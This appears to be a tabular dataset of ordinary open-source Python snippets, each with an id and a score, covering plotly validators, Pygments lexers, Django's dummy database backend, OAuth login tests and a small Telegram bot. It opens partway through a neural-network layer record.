d_b=Gradient(""b""),<<NEWL>>)<<NEWL>>class Mish(Model):<<NEWL>>    """"""Dense layer with mish activation.<<NEWL>>    <<NEWL>>    https://arxiv.org/pdf/1908.08681.pdf<<NEWL>>    """"""<<NEWL>>    name = ""mish""<<NEWL>><<NEWL>>    @property<<NEWL>>    def input_shape(self):<<NEWL>>        return (self.nB, self.nI)<<NEWL>><<NEWL>>    @property<<NEWL>>    def output_shape(self):<<NEWL>>        return (self.nB, self.nO)<<NEWL>><<NEWL>>    def __init__(self, nO=None, nI=None, **kwargs):<<NEWL>>        Model.__init__(self, **kwargs)<<NEWL>>        self.nO = nO<<NEWL>>        self.nI = nI<<NEWL>>        self.drop_factor = kwargs.get(""drop_factor"", 1.0)<<NEWL>><<NEWL>>    def predict(self, X):<<NEWL>>        Y = self.ops.affine(self.W, self.b, X)<<NEWL>>        Y = self.ops.mish(Y)<<NEWL>>        return Y<<NEWL>><<NEWL>>    def begin_update(self, X, drop=0.0):<<NEWL>>        if drop is None:<<NEWL>>            return self.predict(X), None<<NEWL>>        Y1 = self.ops.affine(self.W, self.b, X)<<NEWL>>        Y2 = self.ops.mish(Y1)<<NEWL>>        drop *= self.drop_factor<<NEWL>>        Y3, bp_dropout = self.ops.dropout(Y2, drop)<<NEWL>><<NEWL>>        def finish_update(dY2, sgd=None):<<NEWL>>            dY1 = self.ops.backprop_mish(dY2, Y1)<<NEWL>>            self.ops.gemm(dY1, X, trans1=True, out=self.d_W)<<NEWL>>            self.d_b += dY1.sum(axis=0)<<NEWL>>            dX = self.ops.gemm(dY1, self.W)<<NEWL>>            if sgd is not None:<<NEWL>>                sgd(self._mem.weights, self._mem.gradient, key=self.id)<<NEWL>>            return dX<<NEWL>><<NEWL>>        return Y3, bp_dropout(finish_update)"
99	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""hoverlabel"", parent_name=""treemap"", **kwargs):<<NEWL>>        super(HoverlabelValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            align<<NEWL>>                Sets the horizontal alignment of the text<<NEWL>>                content within hover label box. Has an effect<<NEWL>>                only if the hover label text spans more two or<<NEWL>>                more lines<<NEWL>>            alignsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `align`.<<NEWL>>            bgcolor<<NEWL>>                Sets the background color of the hover labels<<NEWL>>                for this trace<<NEWL>>            bgcolorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `bgcolor`.<<NEWL>>            bordercolor<<NEWL>>                Sets the border color of the hover labels for<<NEWL>>                this trace.<<NEWL>>            bordercolorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `bordercolor`.<<NEWL>>            font<<NEWL>>                Sets the font used in hover labels.<<NEWL>>            namelength<<NEWL>>                Sets the default length (in number of<<NEWL>>                characters) of the trace name in the hover<<NEWL>>                labels for all traces. -1 shows the whole name<<NEWL>>                regardless of length. 0-3 shows the first 0-3<<NEWL>>                characters, and an integer >3 will show the<<NEWL>>                whole name if it is less than that many<<NEWL>>                characters, but if it is longer, will truncate<<NEWL>>                to `namelength - 3` characters and add an<<NEWL>>                ellipsis.<<NEWL>>            namelengthsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `namelength`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
308	adjudicated	2	"""""""<<NEWL>>    pygments.lexers.jmespath<<NEWL>>    ~~~~~~~~~~~~~~~~~~~~~~~~<<NEWL>><<NEWL>>    Lexers for the JMESPath language<<NEWL>><<NEWL>>    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.<<NEWL>>    :license: BSD, see LICENSE for details.<<NEWL>>""""""<<NEWL>><<NEWL>>from pygments.lexer import RegexLexer, bygroups, include<<NEWL>>from pygments.token import String, Punctuation, Whitespace, Name, Operator, \<<NEWL>>    Number, Literal, Keyword<<NEWL>><<NEWL>>__all__ = ['JMESPathLexer']<<NEWL>><<NEWL>><<NEWL>>class JMESPathLexer(RegexLexer):<<NEWL>>    """"""<<NEWL>>    For JMESPath queries.<<NEWL>>    """"""<<NEWL>>    name = 'JMESPath'<<NEWL>>    url = 'https://jmespath.org'<<NEWL>>    filenames = ['*.jp']<<NEWL>>    aliases = ['jmespath', 'jp']<<NEWL>><<NEWL>>    tokens = {<<NEWL>>        'string': [<<NEWL>>            (r""'(\\(.|\n)|[^'\\])*'"", String),<<NEWL>>        ],<<NEWL>>        'punctuation': [<<NEWL>>            (r'(\[\?|[\.\*\[\],:\(\)\{\}\|])', Punctuation),<<NEWL>>        ],<<NEWL>>        'ws': [<<NEWL>>            (r"" |\t|\n|\r"", Whitespace)<<NEWL>>        ],<<NEWL>>        ""dq-identifier"": [<<NEWL>>            (r'[^\\""]+', Name.Variable),<<NEWL>>            (r'\\""', Name.Variable),<<NEWL>>            (r'.', Punctuation, '#pop'),<<NEWL>>        ],<<NEWL>>        'identifier': [<<NEWL>>            (r'(&)?("")', bygroups(Name.Variable, Punctuation), 'dq-identifier'),<<NEWL>>            (r'("")?(&?[A-Za-z][A-Za-z0-9_-]*)("")?', bygroups(Punctuation, Name.Variable, Punctuation)),<<NEWL>>        ],<<NEWL>>        'root': [<<NEWL>>            include('ws'),<<NEWL>>            include('string'),<<NEWL>>            (r'(==|!=|<=|>=|<|>|&&|\|\||!)', Operator),<<NEWL>>            include('punctuation'),<<NEWL>>            (r'@', Name.Variable.Global),<<NEWL>>            (r'(&?[A-Za-z][A-Za-z0-9_]*)(\()', bygroups(Name.Function, Punctuation)),<<NEWL>>            (r'(&)(\()', bygroups(Name.Variable, Punctuation)),<<NEWL>>            include('identifier'),<<NEWL>>            (r'-?\d+', Number),<<NEWL>>            (r'`', Literal, 'literal'),<<NEWL>>        ],<<NEWL>>        'literal': [<<NEWL>>            include('ws'),<<NEWL>>            include('string'),<<NEWL>>            include('punctuation'),<<NEWL>>            (r'(false|true|null)\b', Keyword.Constant),<<NEWL>>            include('identifier'),<<NEWL>>            (r'-?\d+\.?\d*([eE][-+]\d+)?', Number),<<NEWL>>            (r'\\`', Literal),<<NEWL>>            (r'`', Literal, '#pop'),<<NEWL>>        ]<<NEWL>>    }"
318	adjudicated	3	"""""""<<NEWL>>    pygments.lexers.graphviz<<NEWL>>    ~~~~~~~~~~~~~~~~~~~~~~~~<<NEWL>><<NEWL>>    Lexer for the DOT language (graphviz).<<NEWL>><<NEWL>>    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.<<NEWL>>    :license: BSD, see LICENSE for details.<<NEWL>>""""""<<NEWL>><<NEWL>>from pygments.lexer import RegexLexer, bygroups<<NEWL>>from pygments.token import Comment, Keyword, Operator, Name, String, Number, \<<NEWL>>    Punctuation, Whitespace<<NEWL>><<NEWL>><<NEWL>>__all__ = ['GraphvizLexer']<<NEWL>><<NEWL>><<NEWL>>class GraphvizLexer(RegexLexer):<<NEWL>>    """"""<<NEWL>>    For graphviz DOT graph description language.<<NEWL>><<NEWL>>    .. versionadded:: 2.8<<NEWL>>    """"""<<NEWL>>    name = 'Graphviz'<<NEWL>>    url = 'https://www.graphviz.org/doc/info/lang.html'<<NEWL>>    aliases = ['graphviz', 'dot']<<NEWL>>    filenames = ['*.gv', '*.dot']<<NEWL>>    mimetypes = ['text/x-graphviz', 'text/vnd.graphviz']<<NEWL>>    tokens = {<<NEWL>>        'root': [<<NEWL>>            (r'\s+', Whitespace),<<NEWL>>            (r'(#|//).*?$', Comment.Single),<<NEWL>>            (r'/(\\\n)?[*](.|\n)*?[*](\\\n)?/', Comment.Multiline),<<NEWL>>            (r'(?i)(node|edge|graph|digraph|subgraph|strict)\b', Keyword),<<NEWL>>            (r'--|->', Operator),<<NEWL>>            (r'[{}[\]:;,]', Punctuation),<<NEWL>>            (r'(\b\D\w*)(\s*)(=)(\s*)',<<NEWL>>                bygroups(Name.Attribute, Whitespace, Punctuation, Whitespace),<<NEWL>>                'attr_id'),<<NEWL>>            (r'\b(n|ne|e|se|s|sw|w|nw|c|_)\b', Name.Builtin),<<NEWL>>            (r'\b\D\w*', Name.Tag),  # node<<NEWL>>            (r'[-]?((\.[0-9]+)|([0-9]+(\.[0-9]*)?))', Number),<<NEWL>>            (r'""(\\""|[^""])*?""', Name.Tag),  # quoted node<<NEWL>>            (r'<', Punctuation, 'xml'),<<NEWL>>        ],<<NEWL>>        'attr_id': [<<NEWL>>            (r'\b\D\w*', String, '#pop'),<<NEWL>>            (r'[-]?((\.[0-9]+)|([0-9]+(\.[0-9]*)?))', Number, '#pop'),<<NEWL>>            (r'""(\\""|[^""])*?""', String.Double, '#pop'),<<NEWL>>            (r'<', Punctuation, ('#pop', 'xml')),<<NEWL>>        ],<<NEWL>>        'xml': [<<NEWL>>            (r'<', Punctuation, '#push'),<<NEWL>>            (r'>', Punctuation, '#pop'),<<NEWL>>            (r'\s+', Whitespace),<<NEWL>>            (r'[^<>\s]', Name.Tag),<<NEWL>>        ]<<NEWL>>    }"
89	adjudicated	0	"import sys<<NEWL>>from typing import TYPE_CHECKING<<NEWL>><<NEWL>>if sys.version_info < (3, 7) or TYPE_CHECKING:<<NEWL>>    from ._yanchor import YanchorValidator<<NEWL>>    from ._y import YValidator<<NEWL>>    from ._xanchor import XanchorValidator<<NEWL>>    from ._x import XValidator<<NEWL>>    from ._visible import VisibleValidator<<NEWL>>    from ._type import TypeValidator<<NEWL>>    from ._templateitemname import TemplateitemnameValidator<<NEWL>>    from ._showactive import ShowactiveValidator<<NEWL>>    from ._pad import PadValidator<<NEWL>>    from ._name import NameValidator<<NEWL>>    from ._font import FontValidator<<NEWL>>    from ._direction import DirectionValidator<<NEWL>>    from ._buttondefaults import ButtondefaultsValidator<<NEWL>>    from ._buttons import ButtonsValidator<<NEWL>>    from ._borderwidth import BorderwidthValidator<<NEWL>>    from ._bordercolor import BordercolorValidator<<NEWL>>    from ._bgcolor import BgcolorValidator<<NEWL>>    from ._active import ActiveValidator<<NEWL>>else:<<NEWL>>    from _plotly_utils.importers import relative_import<<NEWL>><<NEWL>>    __all__, __getattr__, __dir__ = relative_import(<<NEWL>>        __name__,<<NEWL>>        [],<<NEWL>>        [<<NEWL>>            ""._yanchor.YanchorValidator"",<<NEWL>>            ""._y.YValidator"",<<NEWL>>            ""._xanchor.XanchorValidator"",<<NEWL>>            ""._x.XValidator"",<<NEWL>>            ""._visible.VisibleValidator"",<<NEWL>>            ""._type.TypeValidator"",<<NEWL>>            ""._templateitemname.TemplateitemnameValidator"",<<NEWL>>            ""._showactive.ShowactiveValidator"",<<NEWL>>            ""._pad.PadValidator"",<<NEWL>>            ""._name.NameValidator"",<<NEWL>>            ""._font.FontValidator"",<<NEWL>>            ""._direction.DirectionValidator"",<<NEWL>>            ""._buttondefaults.ButtondefaultsValidator"",<<NEWL>>            ""._buttons.ButtonsValidator"",<<NEWL>>            ""._borderwidth.BorderwidthValidator"",<<NEWL>>            ""._bordercolor.BordercolorValidator"",<<NEWL>>            ""._bgcolor.BgcolorValidator"",<<NEWL>>            ""._active.ActiveValidator"",<<NEWL>>        ],<<NEWL>>    )"
258	adjudicated	2	"import re<<NEWL>>import textwrap<<NEWL>>import email.message<<NEWL>><<NEWL>>from ._text import FoldedCase<<NEWL>><<NEWL>><<NEWL>>class Message(email.message.Message):<<NEWL>>    multiple_use_keys = set(<<NEWL>>        map(<<NEWL>>            FoldedCase,<<NEWL>>            [<<NEWL>>                'Classifier',<<NEWL>>                'Obsoletes-Dist',<<NEWL>>                'Platform',<<NEWL>>                'Project-URL',<<NEWL>>                'Provides-Dist',<<NEWL>>                'Provides-Extra',<<NEWL>>                'Requires-Dist',<<NEWL>>                'Requires-External',<<NEWL>>                'Supported-Platform',<<NEWL>>                'Dynamic',<<NEWL>>            ],<<NEWL>>        )<<NEWL>>    )<<NEWL>>    """"""<<NEWL>>    Keys that may be indicated multiple times per PEP 566.<<NEWL>>    """"""<<NEWL>><<NEWL>>    def __new__(cls, orig: email.message.Message):<<NEWL>>        res = super().__new__(cls)<<NEWL>>        vars(res).update(vars(orig))<<NEWL>>        return res<<NEWL>><<NEWL>>    def __init__(self, *args, **kwargs):<<NEWL>>        self._headers = self._repair_headers()<<NEWL>><<NEWL>>    # suppress spurious error from mypy<<NEWL>>    def __iter__(self):<<NEWL>>        return super().__iter__()<<NEWL>><<NEWL>>    def _repair_headers(self):<<NEWL>>        def redent(value):<<NEWL>>            ""Correct for RFC822 indentation""<<NEWL>>            if not value or '\n' not in value:<<NEWL>>                return value<<NEWL>>            return textwrap.dedent(' ' * 8 + value)<<NEWL>><<NEWL>>        headers = [(key, redent(value)) for key, value in vars(self)['_headers']]<<NEWL>>        if self._payload:<<NEWL>>            headers.append(('Description', self.get_payload()))<<NEWL>>        return headers<<NEWL>><<NEWL>>    @property<<NEWL>>    def json(self):<<NEWL>>        """"""<<NEWL>>        Convert PackageMetadata to a JSON-compatible format<<NEWL>>        per PEP 0566.<<NEWL>>        """"""<<NEWL>><<NEWL>>        def transform(key):<<NEWL>>            value = self.get_all(key) if key in self.multiple_use_keys else self[key]<<NEWL>>            if key == 'Keywords':<<NEWL>>                value = re.split(r'\s+', value)<<NEWL>>            tk = key.lower().replace('-', '_')<<NEWL>>            return tk, value<<NEWL>><<NEWL>>        return dict(map(transform, map(FoldedCase, self)))"
349	adjudicated	3	"import typing as t<<NEWL>>from threading import local<<NEWL>><<NEWL>>if t.TYPE_CHECKING:<<NEWL>>    import typing_extensions as te<<NEWL>>    from .core import Context<<NEWL>><<NEWL>>_local = local()<<NEWL>><<NEWL>><<NEWL>>@t.overload<<NEWL>>def get_current_context(silent: ""te.Literal[False]"" = False) -> ""Context"":<<NEWL>>    ...<<NEWL>><<NEWL>><<NEWL>>@t.overload<<NEWL>>def get_current_context(silent: bool = ...) -> t.Optional[""Context""]:<<NEWL>>    ...<<NEWL>><<NEWL>><<NEWL>>def get_current_context(silent: bool = False) -> t.Optional[""Context""]:<<NEWL>>    """"""Returns the current click context.  This can be used as a way to<<NEWL>>    access the current context object from anywhere.  This is a more implicit<<NEWL>>    alternative to the :func:`pass_context` decorator.  This function is<<NEWL>>    primarily useful for helpers such as :func:`echo` which might be<<NEWL>>    interested in changing its behavior based on the current context.<<NEWL>><<NEWL>>    To push the current context, :meth:`Context.scope` can be used.<<NEWL>><<NEWL>>    .. versionadded:: 5.0<<NEWL>><<NEWL>>    :param silent: if set to `True` the return value is `None` if no context<<NEWL>>                   is available.  The default behavior is to raise a<<NEWL>>                   :exc:`RuntimeError`.<<NEWL>>    """"""<<NEWL>>    try:<<NEWL>>        return t.cast(""Context"", _local.stack[-1])<<NEWL>>    except (AttributeError, IndexError) as e:<<NEWL>>        if not silent:<<NEWL>>            raise RuntimeError(""There is no active click context."") from e<<NEWL>><<NEWL>>    return None<<NEWL>><<NEWL>><<NEWL>>def push_context(ctx: ""Context"") -> None:<<NEWL>>    """"""Pushes a new context to the current stack.""""""<<NEWL>>    _local.__dict__.setdefault(""stack"", []).append(ctx)<<NEWL>><<NEWL>><<NEWL>>def pop_context() -> None:<<NEWL>>    """"""Removes the top level from the stack.""""""<<NEWL>>    _local.stack.pop()<<NEWL>><<NEWL>><<NEWL>>def resolve_color_default(color: t.Optional[bool] = None) -> t.Optional[bool]:<<NEWL>>    """"""Internal helper to get the default value of the color flag.  If a<<NEWL>>    value is passed it's returned unchanged, otherwise it's looked up from<<NEWL>>    the current context.<<NEWL>>    """"""<<NEWL>>    if color is not None:<<NEWL>>        return color<<NEWL>><<NEWL>>    ctx = get_current_context(silent=True)<<NEWL>><<NEWL>>    if ctx is not None:<<NEWL>>        return ctx.color<<NEWL>><<NEWL>>    return None"
209	adjudicated	0	"# (Â©)Codexbotz<<NEWL>># Recode by @mrismanaziz<<NEWL>># t.me/SharingUserbot & t.me/Lunatic0de<<NEWL>><<NEWL>>from bot import Bot<<NEWL>>from config import OWNER<<NEWL>>from Data import Data<<NEWL>>from pyrogram import filters<<NEWL>>from pyrogram.errors import MessageNotModified<<NEWL>>from pyrogram.types import CallbackQuery, InlineKeyboardMarkup, Message<<NEWL>><<NEWL>><<NEWL>>@Bot.on_message(filters.private & filters.incoming & filters.command(""about""))<<NEWL>>async def _about(client: Bot, msg: Message):<<NEWL>>    await client.send_message(<<NEWL>>        msg.chat.id,<<NEWL>>        Data.ABOUT.format(client.username, OWNER),<<NEWL>>        disable_web_page_preview=True,<<NEWL>>        reply_markup=InlineKeyboardMarkup(Data.mbuttons),<<NEWL>>    )<<NEWL>><<NEWL>><<NEWL>>@Bot.on_message(filters.private & filters.incoming & filters.command(""help""))<<NEWL>>async def _help(client: Bot, msg: Message):<<NEWL>>    await client.send_message(<<NEWL>>        msg.chat.id,<<NEWL>>        ""<b>Cara Menggunakan Bot ini</b>\n"" + Data.HELP,<<NEWL>>        disable_web_page_preview=True,<<NEWL>>        reply_markup=InlineKeyboardMarkup(Data.buttons),<<NEWL>>    )<<NEWL>><<NEWL>><<NEWL>>@Bot.on_callback_query()<<NEWL>>async def cb_handler(client: Bot, query: CallbackQuery):<<NEWL>>    data = query.data<<NEWL>>    if data == ""about"":<<NEWL>>        try:<<NEWL>>            await query.message.edit_text(<<NEWL>>                text=Data.ABOUT.format(client.username, OWNER),<<NEWL>>                disable_web_page_preview=True,<<NEWL>>                reply_markup=InlineKeyboardMarkup(Data.mbuttons),<<NEWL>>            )<<NEWL>>        except MessageNotModified:<<NEWL>>            pass<<NEWL>>    elif data == ""help"":<<NEWL>>        try:<<NEWL>>            await query.message.edit_text(<<NEWL>>                text=""<b>Cara Menggunakan Bot ini</b>\n"" + Data.HELP,<<NEWL>>                disable_web_page_preview=True,<<NEWL>>                reply_markup=InlineKeyboardMarkup(Data.buttons),<<NEWL>>            )<<NEWL>>        except MessageNotModified:<<NEWL>>            pass<<NEWL>>    elif data == ""close"":<<NEWL>>        await query.message.delete()<<NEWL>>        try:<<NEWL>>            await query.message.reply_to_message.delete()<<NEWL>>        except BaseException:<<NEWL>>            pass"
198	adjudicated	3	"""""""<<NEWL>>    pygments.lexers.roboconf<<NEWL>>    ~~~~~~~~~~~~~~~~~~~~~~~~<<NEWL>><<NEWL>>    Lexers for Roboconf DSL.<<NEWL>><<NEWL>>    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.<<NEWL>>    :license: BSD, see LICENSE for details.<<NEWL>>""""""<<NEWL>><<NEWL>>from pygments.lexer import RegexLexer, words, re<<NEWL>>from pygments.token import Text, Operator, Keyword, Name, Comment<<NEWL>><<NEWL>>__all__ = ['RoboconfGraphLexer', 'RoboconfInstancesLexer']<<NEWL>><<NEWL>><<NEWL>>class RoboconfGraphLexer(RegexLexer):<<NEWL>>    """"""<<NEWL>>    Lexer for Roboconf graph files.<<NEWL>><<NEWL>>    .. versionadded:: 2.1<<NEWL>>    """"""<<NEWL>>    name = 'Roboconf Graph'<<NEWL>>    aliases = ['roboconf-graph']<<NEWL>>    filenames = ['*.graph']<<NEWL>><<NEWL>>    flags = re.IGNORECASE | re.MULTILINE<<NEWL>>    tokens = {<<NEWL>>        'root': [<<NEWL>>            # Skip white spaces<<NEWL>>            (r'\s+', Text),<<NEWL>><<NEWL>>            # There is one operator<<NEWL>>            (r'=', Operator),<<NEWL>><<NEWL>>            # Keywords<<NEWL>>            (words(('facet', 'import'), suffix=r'\s*\b', prefix=r'\b'), Keyword),<<NEWL>>            (words((<<NEWL>>                'installer', 'extends', 'exports', 'imports', 'facets',<<NEWL>>                'children'), suffix=r'\s*:?', prefix=r'\b'), Name),<<NEWL>><<NEWL>>            # Comments<<NEWL>>            (r'#.*\n', Comment),<<NEWL>><<NEWL>>            # Default<<NEWL>>            (r'[^#]', Text),<<NEWL>>            (r'.*\n', Text)<<NEWL>>        ]<<NEWL>>    }<<NEWL>><<NEWL>><<NEWL>>class RoboconfInstancesLexer(RegexLexer):<<NEWL>>    """"""<<NEWL>>    Lexer for Roboconf instances files.<<NEWL>><<NEWL>>    .. versionadded:: 2.1<<NEWL>>    """"""<<NEWL>>    name = 'Roboconf Instances'<<NEWL>>    aliases = ['roboconf-instances']<<NEWL>>    filenames = ['*.instances']<<NEWL>><<NEWL>>    flags = re.IGNORECASE | re.MULTILINE<<NEWL>>    tokens = {<<NEWL>>        'root': [<<NEWL>><<NEWL>>            # Skip white spaces<<NEWL>>            (r'\s+', Text),<<NEWL>><<NEWL>>            # Keywords<<NEWL>>            (words(('instance of', 'import'), suffix=r'\s*\b', prefix=r'\b'), Keyword),<<NEWL>>            (words(('name', 'count'), suffix=r's*:?', prefix=r'\b'), Name),<<NEWL>>            (r'\s*[\w.-]+\s*:', Name),<<NEWL>><<NEWL>>            # Comments<<NEWL>>            (r'#.*\n', Comment),<<NEWL>><<NEWL>>            # Default<<NEWL>>            (r'[^#]', Text),<<NEWL>>            (r'.*\n', Text)<<NEWL>>        ]<<NEWL>>    }"
456	adjudicated	0	import json<<NEWL>><<NEWL>>from .oauth import OAuth2Test<<NEWL>><<NEWL>><<NEWL>>class GiteaOAuth2Test(OAuth2Test):<<NEWL>>    backend_path = 'social_core.backends.gitea.GiteaOAuth2'<<NEWL>>    user_data_url = 'https://gitea.com/api/v1/user'<<NEWL>>    expected_username = 'foobar'<<NEWL>>    access_token_body = json.dumps({<<NEWL>>        'access_token': 'foobar',<<NEWL>>        'token_type': 'bearer',<<NEWL>>        'expires_in': 7200,<<NEWL>>        'refresh_token': 'barfoo'<<NEWL>>    })<<NEWL>>    user_data_body = json.dumps({<<NEWL>>        'id': 123456,<<NEWL>>        'login': 'foobar',<<NEWL>>        'full_name': 'Foo Bar',<<NEWL>>        'email': 'foobar@example.com',<<NEWL>>        'avatar_url': 'https://gitea.com/user/avatar/foobar/-1',<<NEWL>>        'language': 'en-US',<<NEWL>>        'is_admin': False,<<NEWL>>        'last_login': '2016-12-28T12:26:19+01:00',<<NEWL>>        'created': '2016-12-28T12:26:19+01:00',<<NEWL>>        'restricted': False,<<NEWL>>        'username': 'foobar'<<NEWL>>    })<<NEWL>><<NEWL>>    def test_login(self):<<NEWL>>        self.do_login()<<NEWL>><<NEWL>>    def test_partial_pipeline(self):<<NEWL>>        self.do_partial_pipeline()<<NEWL>><<NEWL>><<NEWL>>class GiteaCustomDomainOAuth2Test(OAuth2Test):<<NEWL>>    backend_path = 'social_core.backends.gitea.GiteaOAuth2'<<NEWL>>    user_data_url = 'https://example.com/api/v1/user'<<NEWL>>    expected_username = 'foobar'<<NEWL>>    access_token_body = json.dumps({<<NEWL>>        'access_token': 'foobar',<<NEWL>>        'token_type': 'bearer',<<NEWL>>        'expires_in': 7200,<<NEWL>>        'refresh_token': 'barfoo'<<NEWL>>    })<<NEWL>>    user_data_body = json.dumps({<<NEWL>>        'id': 123456,<<NEWL>>        'login': 'foobar',<<NEWL>>        'full_name': 'Foo Bar',<<NEWL>>        'email': 'foobar@example.com',<<NEWL>>        'avatar_url': 'https://example.com/user/avatar/foobar/-1',<<NEWL>>        'language': 'en-US',<<NEWL>>        'is_admin': False,<<NEWL>>        'last_login': '2016-12-28T12:26:19+01:00',<<NEWL>>        'created': '2016-12-28T12:26:19+01:00',<<NEWL>>        'restricted': False,<<NEWL>>        'username': 'foobar'<<NEWL>>    })<<NEWL>><<NEWL>>    def test_login(self):<<NEWL>>        self.strategy.set_settings({<<NEWL>>            'SOCIAL_AUTH_GITEA_API_URL': 'https://example.com'<<NEWL>>        })<<NEWL>>        self.do_login()<<NEWL>><<NEWL>>    def test_partial_pipeline(self):<<NEWL>>        self.strategy.set_settings({<<NEWL>>            'SOCIAL_AUTH_GITEA_API_URL': 'https://example.com'<<NEWL>>        })<<NEWL>>        self.do_partial_pipeline()
462	adjudicated	2	"""""""<<NEWL>>Dummy database backend for Django.<<NEWL>><<NEWL>>Django uses this if the database ENGINE setting is empty (None or empty string).<<NEWL>><<NEWL>>Each of these API functions, except connection.close(), raise<<NEWL>>ImproperlyConfigured.<<NEWL>>""""""<<NEWL>><<NEWL>>from django.core.exceptions import ImproperlyConfigured<<NEWL>>from django.db.backends.base.base import BaseDatabaseWrapper<<NEWL>>from django.db.backends.base.client import BaseDatabaseClient<<NEWL>>from django.db.backends.base.creation import BaseDatabaseCreation<<NEWL>>from django.db.backends.base.introspection import BaseDatabaseIntrospection<<NEWL>>from django.db.backends.base.operations import BaseDatabaseOperations<<NEWL>>from django.db.backends.dummy.features import DummyDatabaseFeatures<<NEWL>><<NEWL>><<NEWL>>def complain(*args, **kwargs):<<NEWL>>    raise ImproperlyConfigured(<<NEWL>>        ""settings.DATABASES is improperly configured. ""<<NEWL>>        ""Please supply the ENGINE value. Check ""<<NEWL>>        ""settings documentation for more details.""<<NEWL>>    )<<NEWL>><<NEWL>><<NEWL>>def ignore(*args, **kwargs):<<NEWL>>    pass<<NEWL>><<NEWL>><<NEWL>>class DatabaseOperations(BaseDatabaseOperations):<<NEWL>>    quote_name = complain<<NEWL>><<NEWL>><<NEWL>>class DatabaseClient(BaseDatabaseClient):<<NEWL>>    runshell = complain<<NEWL>><<NEWL>><<NEWL>>class DatabaseCreation(BaseDatabaseCreation):<<NEWL>>    create_test_db = ignore<<NEWL>>    destroy_test_db = ignore<<NEWL>><<NEWL>><<NEWL>>class DatabaseIntrospection(BaseDatabaseIntrospection):<<NEWL>>    get_table_list = complain<<NEWL>>    get_table_description = complain<<NEWL>>    get_relations = complain<<NEWL>>    get_indexes = complain<<NEWL>><<NEWL>><<NEWL>>class DatabaseWrapper(BaseDatabaseWrapper):<<NEWL>>    operators = {}<<NEWL>>    # Override the base class implementations with null<<NEWL>>    # implementations. Anything that tries to actually<<NEWL>>    # do something raises complain; anything that tries<<NEWL>>    # to rollback or undo something raises ignore.<<NEWL>>    _cursor = complain<<NEWL>>    ensure_connection = complain<<NEWL>>    _commit = complain<<NEWL>>    _rollback = ignore<<NEWL>>    _close = ignore<<NEWL>>    _savepoint = ignore<<NEWL>>    _savepoint_commit = complain<<NEWL>>    _savepoint_rollback = ignore<<NEWL>>    _set_autocommit = complain<<NEWL>>    # Classes instantiated in __init__().<<NEWL>>    client_class = DatabaseClient<<NEWL>>    creation_class = DatabaseCreation<<NEWL>>    features_class = DummyDatabaseFeatures<<NEWL>>    introspection_class = DatabaseIntrospection<<NEWL>>    ops_class = DatabaseOperations<<NEWL>><<NEWL>>    def is_usable(self):<<NEWL>>        return True"
433	adjudicated	2	"# Copyright 2016 Julien Danjou<<NEWL>># Copyright 2016 Joshua Harlow<<NEWL>># Copyright 2013-2014 Ray Holder<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>># http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>>import sys<<NEWL>>import typing<<NEWL>><<NEWL>><<NEWL>># sys.maxsize:<<NEWL>># An integer giving the maximum value a variable of type Py_ssize_t can take.<<NEWL>>MAX_WAIT = sys.maxsize / 2<<NEWL>><<NEWL>><<NEWL>>def find_ordinal(pos_num: int) -> str:<<NEWL>>    # See: https://en.wikipedia.org/wiki/English_numerals#Ordinal_numbers<<NEWL>>    if pos_num == 0:<<NEWL>>        return ""th""<<NEWL>>    elif pos_num == 1:<<NEWL>>        return ""st""<<NEWL>>    elif pos_num == 2:<<NEWL>>        return ""nd""<<NEWL>>    elif pos_num == 3:<<NEWL>>        return ""rd""<<NEWL>>    elif 4 <= pos_num <= 20:<<NEWL>>        return ""th""<<NEWL>>    else:<<NEWL>>        return find_ordinal(pos_num % 10)<<NEWL>><<NEWL>><<NEWL>>def to_ordinal(pos_num: int) -> str:<<NEWL>>    return f""{pos_num}{find_ordinal(pos_num)}""<<NEWL>><<NEWL>><<NEWL>>def get_callback_name(cb: typing.Callable[..., typing.Any]) -> str:<<NEWL>>    """"""Get a callback fully-qualified name.<<NEWL>><<NEWL>>    If no name can be produced ``repr(cb)`` is called and returned.<<NEWL>>    """"""<<NEWL>>    segments = []<<NEWL>>    try:<<NEWL>>        segments.append(cb.__qualname__)<<NEWL>>    except AttributeError:<<NEWL>>        try:<<NEWL>>            segments.append(cb.__name__)<<NEWL>>        except AttributeError:<<NEWL>>            pass<<NEWL>>    if not segments:<<NEWL>>        return repr(cb)<<NEWL>>    else:<<NEWL>>        try:<<NEWL>>            # When running under sphinx it appears this can be none?<<NEWL>>            if cb.__module__:<<NEWL>>                segments.insert(0, cb.__module__)<<NEWL>>        except AttributeError:<<NEWL>>            pass<<NEWL>>        return ""."".join(segments)"
